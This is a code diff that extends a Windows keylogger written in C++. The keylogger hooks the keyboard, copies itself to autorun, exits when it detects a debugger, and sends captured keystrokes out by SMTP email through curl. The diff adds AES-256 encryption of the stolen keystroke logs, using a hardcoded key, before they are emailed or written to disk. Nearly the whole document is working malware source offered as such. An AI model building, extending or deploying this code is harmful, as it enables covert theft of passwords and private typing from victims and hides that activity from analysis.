@@ -6,6 +6,8 @@
 
 #include <string>
 #include <fstream>
+#include <sstream>
+#include <vector>
 
 #include <windows.h>
 #include <WinBase.h>
@@ -13,8 +15,11 @@
 
 #include <curl/curl.h>
 
+#include "AES.h"
+
 typedef std::basic_string<TCHAR, std::char_traits<TCHAR>, std::allocator<TCHAR> > tstring;
 using std::string;
+using std::vector;
 enum workMode {
 	sendLogEmail,
 	writeLogFile
@@ -28,11 +33,15 @@ bool	copyToAutorun = true;
 int		timerPeriodSeconds = 10;
 
 //Mail settings
+bool trySendEmail = true;
 string login = "sender@example.com";
 string password = "password";
 string URL = "smtp://smtp.example.com:587";
 string repicient = "repicient@example.com";
-bool trySendEmail = true;
+
+//Encryption settings
+bool encryptLogs = true;
+string aesKey = "cdf851f8efcc9c58c980642ecb43665c1b3779754e22462c0bf63cd66429cdc9";
 
 //Global variables
 string keyLog;
@@ -43,6 +52,8 @@ string header = "To: " + repicient + "\r\n" +
 "Subject: Log\r\n\r\n";
 workMode mode = trySendEmail ? sendLogEmail : writeLogFile;
 struct curl_slist* recipients = NULL;
+vector<unsigned char> key;
+AES aes(256);
 
 //Function prototypes
 LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam);
@@ -51,6 +62,9 @@ static size_t readfunc(void* ptr, size_t size, size_t nmemb, void* userp);
 void processLog();
 bool sendMail();
 void checkDebugging();
+vector<unsigned char> hexToBytes(const string& hex);
+inline char hexDigit(unsigned a);
+string bytesToHex(unsigned char* data, int length);
 
 //Main
 int APIENTRY _tWinMain(HINSTANCE This, HINSTANCE Prev, LPTSTR cmd, int mode)
@@ -59,6 +73,10 @@ int APIENTRY _tWinMain(HINSTANCE This, HINSTANCE Prev, LPTSTR cmd, int mode)
 	if(trySendEmail)
 		recipients = curl_slist_append(recipients, repicient.c_str());
 	checkDebugging();
+
+	//Init encryption
+	if (encryptLogs)
+		key = hexToBytes(aesKey);
 
 	//Create directory for log
 	CreateDirectory(dirPath.c_str(), NULL);
@@ -149,6 +167,17 @@ void processLog()
 	checkDebugging();
 	if (keyLog.empty())
 		return;
+	if (encryptLogs)
+	{
+		vector<unsigned char> input(keyLog.size());
+
+		for (int i = 0; i < keyLog.size(); ++i)
+			input[i] = keyLog[i];
+		
+		unsigned int encryptedLength;
+		unsigned char* encrypted = aes.EncryptECB(&input[0], keyLog.size(), &key[0], encryptedLength);
+		keyLog = bytesToHex(encrypted, encryptedLength) + "\nENDBLOCK\n";
+	}
 	if (mode == sendLogEmail)
 	{
 		if (!sendMail())
@@ -216,4 +245,27 @@ void checkDebugging()
 
 	if (IsDebuggerPresent() || dbgPresent || context.Dr0 != 0 || context.Dr1 != 0 || context.Dr2 != 0 || context.Dr3 != 0)
 		exit(0);
+}
+
+vector<unsigned char> hexToBytes(const string& hex)
+{
+	vector<unsigned char> bytes(hex.size() / 2);
+	for (unsigned int i = 0; i < bytes.size(); ++i)
+		bytes[i] = (unsigned char)strtol(hex.substr(2 * i, 2).c_str(), NULL, 16);
+	return bytes;
+}
+
+inline char hexDigit(unsigned a)
+{
+	return a + (a < 10 ? '0' : 'a' - 10);
+}
+
+string bytesToHex(unsigned char * data, int length)
+{
+	string r(length * 2, '\0');
+	for (unsigned i = 0; i < length; ++i) {
+		r[i * 2] = hexDigit(data[i] >> 4);
+		r[i * 2 + 1] = hexDigit(data[i] & 15);
+	}
+	return r;
 }
